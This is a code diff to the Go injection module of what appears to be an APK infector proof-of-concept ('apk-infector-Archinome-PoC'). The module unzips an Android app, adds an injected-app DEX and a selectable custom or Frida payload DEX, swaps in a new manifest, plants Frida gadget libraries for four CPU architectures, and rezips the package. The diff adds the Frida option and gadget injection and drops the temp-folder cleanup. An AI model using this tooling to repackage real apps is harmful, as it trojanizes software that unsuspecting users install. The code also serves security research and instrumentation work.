@@ -10,13 +10,81 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
 )
 
 var zipOutput, _ = filepath.Abs("sample_unzipped")
 var injectedAppPrevName, _ = filepath.Abs("InjectedApp_patched.dex")
-var payloadPrevName, _ = filepath.Abs("payload.dex")
+var payload_custom_name, _ = filepath.Abs("payload_custom.dex")
+var payload_frida_name, _ = filepath.Abs("payload_frida.dex")
+var frida_gadget_path_arm64, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "arm64-v8a", os.PathSeparator, "libfrida-gadget.so"))
+var frida_gadget_path_arm, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "armeabi-v7a", os.PathSeparator, "libfrida-gadget.so"))
+var frida_gadget_path_x86, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "x86", os.PathSeparator, "libfrida-gadget.so"))
+var frida_gadget_path_x64, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "x86_64", os.PathSeparator, "libfrida-gadget.so"))
+
+//var lib_test_path, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "x86_64", os.PathSeparator, "libexample.so"))
+
+// CopyFile copies a file from src to dst. If src and dst files exist, and are
+// the same, then return success. Otherise, attempt to create a hard link
+// between the two files. If that fail, copy the file contents from src to dst.
+func CopyFile(src, dst string) (err error) {
+	sfi, err := os.Stat(src)
+	if err != nil {
+		return
+	}
+	if !sfi.Mode().IsRegular() {
+		// cannot copy non-regular files (e.g., directories,
+		// symlinks, devices, etc.)
+		return fmt.Errorf("CopyFile: non-regular source file %s (%q)", sfi.Name(), sfi.Mode().String())
+	}
+	dfi, err := os.Stat(dst)
+	if err != nil {
+		if !os.IsNotExist(err) {
+			return
+		}
+	} else {
+		if !(dfi.Mode().IsRegular()) {
+			return fmt.Errorf("CopyFile: non-regular destination file %s (%q)", dfi.Name(), dfi.Mode().String())
+		}
+		if os.SameFile(sfi, dfi) {
+			return
+		}
+	}
+	if err = os.Link(src, dst); err == nil {
+		return
+	}
+	err = copyFileContents(src, dst)
+	return
+}
+
+// copyFileContents copies the contents of the file named src to the file named
+// by dst. The file will be created if it does not already exist. If the
+// destination file exists, all it's contents will be replaced by the contents
+// of the source file.
+func copyFileContents(src, dst string) (err error) {
+	in, err := os.Open(src)
+	if err != nil {
+		return
+	}
+	defer in.Close()
+	out, err := os.Create(dst)
+	if err != nil {
+		return
+	}
+	defer func() {
+		cerr := out.Close()
+		if err == nil {
+			err = cerr
+		}
+	}()
+	if _, err = io.Copy(out, in); err != nil {
+		return
+	}
+	err = out.Sync()
+	return
+}
 
 func Inject(path string, zipModifiedOutput string) {
 
@@ -33,11 +101,10 @@ func Inject(path string, zipModifiedOutput string) {
 		}
 	}
 
-
 	//unzip apk
 	files, err := unzip(path, zipOutput)
 	if err != nil {
-		log.Panic("Failed to unzip APK",err)
+		log.Panic("Failed to unzip APK", err)
 		//log.Printf("Unzipped:\n" + strings.Join(files, "\n"))
 	}
 
@@ -53,44 +120,47 @@ func Inject(path string, zipModifiedOutput string) {
 	log.Printf("max classes dex index = %d", max)
 	max += 1
 
-	
-
 	// inject InjectedApp.dex
 	var injectedAppNewName = "classes" + strconv.Itoa(max) + ".dex"
 
+	copy(injectedAppPrevName, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, injectedAppNewName))
 
-	copy(injectedAppPrevName,  fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, injectedAppNewName))
-
-	max +=1
+	max += 1
 
 	// inject payload.dex
 	var payloadNewName = "classes" + strconv.Itoa(max) + ".dex"
 
+	var payload_name string
 
-	copy(payloadPrevName, fmt.Sprintf("%s%c%s",zipOutput, os.PathSeparator, payloadNewName))
+	if (utils.Payload_option == int(utils.Custom_payload)) {
+		payload_name = payload_custom_name
+	} else if (utils.Payload_option == int(utils.Frida_payload)) {
+		payload_name = payload_frida_name
+	}
+
+	copy(payload_name, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, payloadNewName))
 
 	log.Printf("Successfuly injected DEX:" + injectedAppNewName + "," + payloadNewName)
 
 	//replace manifest
 	copy(utils.ManifestBinaryPath, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, "AndroidManifest.xml"))
 
-	// zip all files
+	// inject frida gadget
+	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-arm64.so"), frida_gadget_path_arm64)
+	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-arm.so"), frida_gadget_path_arm)
+	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-x86.so"), frida_gadget_path_x86)
+	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-x86_64.so"), frida_gadget_path_x64)
+
+
+	// // zip all files
 	fmt.Println("\t--zipping...")
 	ZipWriter(zipModifiedOutput)
 
-	//delete sample_unzipped - we dont need it
-
-	if _, err := os.Stat(zipOutput); err == nil {
-		err := os.RemoveAll(zipOutput)
-		if err != nil {
-			log.Panic(err)
-		}
-	}
+	
 }
 
-
 func ZipWriter(zipModifiedOutput string) {
-	baseFolder,_ := filepath.Abs("sample_unzipped")
+	baseFolder, _ := filepath.Abs("sample_unzipped")
 
 	// Get a Buffer to Write To
 	outFile, err := os.Create(zipModifiedOutput)
@@ -102,11 +172,11 @@ func ZipWriter(zipModifiedOutput string) {
 	// Create a new zip archive.
 	zipWriter := zip.NewWriter(outFile)
 	defer zipWriter.Close()
-	
+
 	// Register a custom Deflate compressor.
 	// w.RegisterCompressor(
 	// 	//zip.Deflate,
-	// 	zip.Store, 
+	// 	zip.Store,
 	// 	func(out io.Writer) (io.WriteCloser, error) {
 	// 	//return flate.NewWriter(out, flate.BestCompression)
 	// 	return flate.NewWriter(out, flate.NoCompression)
@@ -178,6 +248,7 @@ func addFileToZip(zipWriter *zip.Writer, filename, baseDir string) error {
 
 	return nil
 }
+
 // func addFiles(w *zip.Writer, basePath, baseInZip string) {
 // 	// Open the Directory
 // 	files, err := os.ReadDir(basePath)
@@ -215,9 +286,7 @@ func addFileToZip(zipWriter *zip.Writer, filename, baseDir string) error {
 // 	}
 // }
 
-
-
-func copy(src, dst string){
+func copy(src, dst string) {
 	sourceFileStat, err := os.Stat(src)
 	if err != nil {
 		log.Panic("Failed to inject DEX", err)
@@ -261,7 +330,7 @@ func unzip(src string, dest string) ([]string, error) {
 		// Store filename/path for returning and using later on
 		fpath := filepath.Join(dest, f.Name)
 
-		// Check for ZipSlip. 
+		// Check for ZipSlip.
 		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
 			return filenames, fmt.Errorf("%s: illegal file path", fpath)
 		}
@@ -301,4 +370,3 @@ func unzip(src string, dest string) ([]string, error) {
 	}
 	return filenames, nil
 }
-
